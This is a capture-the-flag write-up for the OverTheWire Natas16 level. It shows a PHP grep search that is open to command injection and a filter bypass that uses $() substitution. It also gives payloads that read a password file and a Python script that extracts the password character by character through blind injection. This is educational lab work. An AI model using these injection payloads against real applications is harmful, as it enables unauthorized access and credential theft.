# Natas16
#natas #blind-command-injection 
## Vulnerability:
The application is vulnerable to **command injection** because user-controlled input from the `needle` parameter is directly inserted into a system command executed with `passthru()`. 
## Technique:
Used a python script to automate the Blind Command Injection process and extract the password character by character.
#### Steps:
###### 1) Analyzing the web application and its behavior
**Screenshot:**

<img width="1572" height="691" alt="image" src="https://github.com/user-attachments/assets/2e6e448a-9866-48fd-80a2-aabeb2a3a9d6" />

**Source code:**
```php
<?php

ini_set('pcre.jit', 0);

$key = "";

if (array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if ($key != "") {

    if (preg_match('/[;|&`\'"]/', $key)) {
        print "Input contains an illegal character!";

    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }

}

?>
```
The web application allows users to search for words using the `needle` parameter. The user input is directly inserted into a system command, making it vulnerable to command injection.
However, the application filters important characters such as `;`, `|`, `&`, backticks, and quotes to prevent common command injection techniques.
But we still can use bash command substitution (`$()`).

> [!NOTE]
> **Bash command substitution** allows the output of a command to be used as part of another command. It is performed using `$(command)`, where Bash executes the command inside the parentheses and replaces it with the command's output.
> For example:
>```bash
> echo $(whoami)
>````
> first executes:
>
>```bash
> whoami
>```
>
>and replaces `$(whoami)` with its output:
>
>```bash
> echo kali
>```

###### 2) Exploiting command substitution
As the executed command is :
```bash
grep -i "$key" dictionary.txt
```
we can't comment out or remove dictionary.txt. Therefore, we need to use the command's behavior to retrieve the password.

We can try the following payload:
```
$(cut -c1 /etc/natas_webpass/natas17)
```
the executed command becomes:
```shell
grep -i "$(cut -c1 /etc/natas_webpass/natas17)" dictionary.txt
```
for example if the first character of the password is `a`, the final command will be:
```shell
grep -i "a" dictionary.txt
```
**Result:**

<img width="1362" height="1168" alt="image" src="https://github.com/user-attachments/assets/1487b90b-fe70-452a-8538-1eb2b7ca5fb8" />

We now know that the first character of the password is `K`. However, when testing with lowercase `k`, we obtained the same result. This happens because `grep -i` performs a case-insensitive search, which prevents us from distinguishing between uppercase and lowercase characters.
In addition, the dictionary.txt file doesn't contain digits, therefore when the `cut` commands produces a number, we won't get an output.
###### 3) Performing Blind Command Injection
Instead of using command substitution to directly retrieve parts of the password, we can use it to compare characters against the password and generate specific outputs depending on whether the condition is true or false.
For example we can use an `if` `else` statement:
```Shell
$(
 if [ $(cut -c<position> /etc/natas_webpass/natas17) = character ]
 then 
      echo "Africans"
 else 
      echo "timezone"
 fi
 )
```
This performs a case sensitive comparison, and we can use a python script to automate it:
**Script:**
```python
import requests  
import string  
from bs4 import BeautifulSoup  
  
auth = ("natas16", "<NATAS15_PASSWORD>")  
  
chars = string.ascii_letters + string.digits  
  
password = ""  
  
for position in range(1,33):  
    for c in chars:  
        search = f"%24%28if+%5B+%24%28cut+-c{position}+%2Fetc%2Fnatas_webpass%2Fnatas17%29+%3D+{c}+%5D+%0Athen+%0Aecho+Africans+%0Aelse+%0Aecho+timezone+%0Afi%29"  
        
        url = f"http://natas16.natas.labs.overthewire.org/?needle={search}&submit=Search"  
        
        r = requests.get(url, auth=auth)  
        result = r.text  
        soup = BeautifulSoup(result, "html.parser")  
  
        output = soup.find("pre").text.strip()
          
        if "Africans" in output:  
            password += c  
            if (position-1) % 10 == 0 or position == 32:  
                 print(f"[{position - 1}] Password: {password}")  
            break
```
The script sends a request for each possible character at each password position. When the correct character is found, which means that the output is `Africans`, it is saved and the process continues until the full password is retrieved.
> [!NOTE]
> BeautifulSoup is used to parse the HTML response and extract only the command output from the `<pre>` tag.

**Result:**
```
[0] Password: K
[10] Password: K----------
[20] Password: K--------------------
[30] Password: K------------------------------
[31] Password: K------------------------------x
```
## Password found:
[Not disclosed — solve it yourself!]
## Previous Level:
[Natas15](./Natas15.md)
## Next Level:
[Natas17](./Natas17.md)
